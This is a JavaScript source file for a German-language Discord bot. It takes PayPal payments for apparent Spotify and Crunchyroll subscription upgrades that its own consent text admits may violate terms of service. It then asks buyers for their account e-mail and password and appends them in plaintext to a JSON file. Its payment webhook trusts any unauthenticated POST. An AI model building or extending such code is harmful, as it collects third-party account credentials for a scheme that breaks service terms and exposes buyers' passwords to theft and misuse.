// Discord.js v14 Bot mit Zahlungserkennung über Webhook (verbessert)
const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, Events, REST, Routes, SlashCommandBuilder } = require('discord.js');
const fs = require('fs');
const express = require('express');
require('dotenv').config();

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
  partials: [Partials.Channel]
});

const commands = [
  new SlashCommandBuilder().setName('start').setDescription('Beginnt den Abo-Prozess')
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
(async () => {
  try {
    console.log('🔄 Registriere Slash-Commands...');
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('✅ Slash-Commands registriert.');
  } catch (err) {
    console.error(err);
  }
})();

client.once('ready', () => {
  console.log(`✅ Bot online als ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand() && !interaction.isButton()) return;

  if (interaction.isChatInputCommand() && interaction.commandName === 'start') {
    const consentRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('consent_accept').setLabel('Ich stimme zu').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('consent_decline').setLabel('Ich lehne ab').setStyle(ButtonStyle.Danger)
    );

    await interaction.reply({
      content: `Bevor wir fortfahren, musst du dein Einverständnis geben:

☑️ Deine Daten werden temporär verarbeitet.
☑️ Du verstehst, dass dies gegen AGB verstoßen kann.
☑️ Du hast dein Passwort vor dem Prozess geändert.
☑️ Keine aktiven Abos auf dem Account.

Bitte stimme zu, um fortzufahren.`,
      components: [consentRow],
      ephemeral: true
    });
  }

  if (interaction.isButton()) {
    if (interaction.customId === 'consent_decline') {
      return await interaction.update({ content: '❌ Vorgang abgebrochen.', components: [] });
    }

    if (interaction.customId === 'consent_accept') {
      const serviceRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('choose_spotify').setLabel('Spotify (30 €)').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId('choose_crunchyroll').setLabel('Crunchyroll (40 €)').setStyle(ButtonStyle.Secondary)
      );

      return await interaction.update({
        content: '✅ Zustimmung erhalten. Bitte wähle deinen Dienst:',
        components: [serviceRow]
      });
    }

    if (interaction.customId.startsWith('choose_')) {
      const service = interaction.customId === 'choose_spotify' ? 'Spotify' : 'Crunchyroll';

      await interaction.update({
        content: `ℹ️ Du hast **${service}** gewählt. Bitte zahle via PayPal:
🔗 https://paypal.me/deinlink

⏳ Wir prüfen automatisch deine Zahlung...`,
        components: []
      });

      let checks = 0;
      const interval = setInterval(() => {
        let paidMap = {};
        if (fs.existsSync('paidUsers.json')) {
          paidMap = JSON.parse(fs.readFileSync('paidUsers.json'));
        }

        if (paidMap[interaction.user.id]) {
          clearInterval(interval);

          const continueRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId(`paid_continue_${service.toLowerCase()}`)
              .setLabel('Weiter')
              .setStyle(ButtonStyle.Success)
          );

          interaction.followUp({
            content: '✅ Zahlung erkannt. Du kannst jetzt fortfahren:',
            components: [continueRow],
            ephemeral: true
          });
        }

        checks++;
        if (checks >= 6) clearInterval(interval);
      }, 10000);
    }

    if (interaction.customId.startsWith('paid_continue_')) {
      const service = interaction.customId.split('_')[2];
      const modal = new ModalBuilder()
        .setCustomId(`login_modal_${service}`)
        .setTitle(`${service.charAt(0).toUpperCase() + service.slice(1)} Zugangsdaten`)
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('email_input').setLabel('E-Mail / Benutzername').setStyle(TextInputStyle.Short).setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder().setCustomId('password_input').setLabel('Passwort').setStyle(TextInputStyle.Short).setRequired(true)
          )
        );

      return await interaction.showModal(modal);
    }
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('login_modal_')) {
    const service = interaction.customId.split('_')[2];
    const email = interaction.fields.getTextInputValue('email_input');
    const password = interaction.fields.getTextInputValue('password_input');

    const logEntry = {
      timestamp: new Date().toISOString(),
      user: interaction.user.tag,
      userId: interaction.user.id,
      service,
      email,
      password
    };

    fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
      if (err) console.error('Fehler beim Speichern:', err);
    });

    await interaction.reply({
      content: `✅ Danke! Deine Daten für **${service}** wurden empfangen.`,
      ephemeral: true
    });
  }
});

// Express Webserver für Webhook
const app = express();
app.use(express.json());

app.post('/paypal-webhook', (req, res) => {
  const event = req.body;

  if (event.event_type === 'CHECKOUT.ORDER.APPROVED') {
    const payerEmail = event.resource.payer.email_address;
    const customId = event.resource.custom_id;

    let paidMap = {};
    if (fs.existsSync('paidUsers.json')) {
      paidMap = JSON.parse(fs.readFileSync('paidUsers.json'));
    }

    paidMap[customId] = true;
    fs.writeFileSync('paidUsers.json', JSON.stringify(paidMap));
  }

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log('🌐 Webhook-Server läuft auf Port 3000');
});

client.login(process.env.TOKEN);
